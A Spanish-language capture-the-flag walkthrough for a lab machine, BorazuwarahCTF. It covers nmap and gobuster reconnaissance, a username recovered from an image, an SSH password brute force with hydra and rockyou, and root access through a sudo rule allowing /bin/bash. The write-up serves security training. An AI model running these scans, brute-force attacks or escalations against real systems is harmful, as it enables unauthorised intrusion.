# BorazuwarahCTF
![image](https://github.com/user-attachments/assets/30562465-cc76-411d-9c42-d8cf6859c980)

## Reconocimiento y Enumeración.

Comprobar que la máquina está en marcha.

```bash
❯ ping -c 1 172.17.0.2
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.036 ms

--- 172.17.0.2 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.036/0.036/0.036/0.000 ms

```

Una vez nos responde ping ya podemos empezar enumerando la máquina. El ttl=64 nos puede indicar que sea una máquina **Linux**.

Lanzamos nmap para ver que puertos nos encuentra.

```bash
nmap -sS -p- --open --min-rate 5000 -vvv -n -Pn -oG allPorts 172.17.0.2
```
```
- `-sS`: Realiza un escaneo SYN.
- `-p-`: Escanea todos los puertos.
- `--open`: Muestra solo los puertos abiertos.
- `--min-rate 5000`: Establece la velocidad mínima de envío de paquetes a 5000 por segundo.
- `-vvv`: Genera una salida muy detallada y verbosa.
- `-n`: Evita la resolución de DNS inversa.
- `-Pn`: Omite la detección de hosts.
- `-oG allPorts`: Guarda los resultados en un archivo llamado "allPorts".
- `172.17.0.2`: La dirección IP del host objetivo.
```
```
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
```
Como tenemos abierto el puerto 22 y 80, vamos a comprobar la versión y lanzar unos scripts básicos para ver que información obtenemos.

```bash
nmap -sCV -p22,80 -vvv -oN versionPorts 172.17.0.2
```
```
- `-sCV`: Escaneo de versiones y vulnerabilidades.
- `-p22,80`: Escaneo de los puertos.
- `-vvv`: Salida muy detallada y verbosa.
- `-oN versionPorts`: Guarda los resultados en "versionPorts".
- `172.17.0.2`: Dirección IP del host escaneado.
```
```
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey: 
|   256 3d:fd:d7:c8:17:97:f5:12:b1:f5:11:7d:af:88:06:fe (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDuOdJLZN+CNU+7dcTJQbPr6zY2+Ou1YFR0w9Pan1DfaPUZljRHJcNmvSncrihzQ3HOAHfMWWvSzN+ZMC0YmWoA=
|   256 43:b3:ba:a9:32:c9:01:43:ee:62:d0:11:12:1d:5d:17 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGDv2JqKvBCR+Badmkr7YKPypEYshuCXxzM5+YdozyBD
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.59 ((Debian))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.59 (Debian)
|_http-title: Site doesn't have a title (text/html).
MAC Address: 02:42:AC:11:00:02 (Unknown)
```
Utilizamos **gobuster** para hacer fuzzing y ver si encontramos directorios o páginas en el puerto 80.

```
gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt
```
Encontramos únicamente ***index.html*** en la que únicamente vemos una imagen que procedemos a descargarla para ver si encontramos algo oculto dentro.

![image](https://github.com/user-attachments/assets/0e4abfa4-931c-40b0-800f-7d2921f4f966)

Vemos que dentro de la imagen encontramos un usuario **borazuwarah** que podemos utilizar para conectarnos por ***ssh*** por fuerza bruta con **hydra**.

## Explotación.

```
hydra -l borazuwarah -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2
```
![image](https://github.com/user-attachments/assets/d8d5ad7e-5e8c-4f21-8be9-3631844b1349)

Ahora nos conectamos por **ssh** con las credenciales obtenidas.

![image](https://github.com/user-attachments/assets/481a1e42-2d48-4fe3-b56f-4b320d8b4942)

## Escalada de privilegios.

Comprobamos si hay algún binario que podamos explotar y nos encontramos que podemos ejecutar como **root** una **/bin/bash**.

![image](https://github.com/user-attachments/assets/65af5a3f-6ad7-4ca0-bc70-fdcf3049cd2a)

```
sudo -u root /bin/bash
```
![image](https://github.com/user-attachments/assets/84a75270-1f2a-4748-8eb0-6f194110f104)




